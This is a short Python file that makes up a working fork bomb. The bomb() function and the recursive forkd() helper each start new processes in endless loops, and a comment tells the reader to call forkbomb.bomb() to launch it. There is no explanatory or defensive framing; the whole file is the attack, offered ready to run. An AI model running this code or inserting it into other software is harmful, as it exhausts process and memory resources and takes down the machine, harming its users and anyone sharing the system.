import multiprocessing as mp

#Do forkbomb.bomb() to start the bomb

def forkd():
	x = ''
	while(True):
		p = mp.Process(target=forkd)
		p.start()
		x *= 512
def bomb():
	while(True):
		p = mp.Process(target=forkd)
		p.start()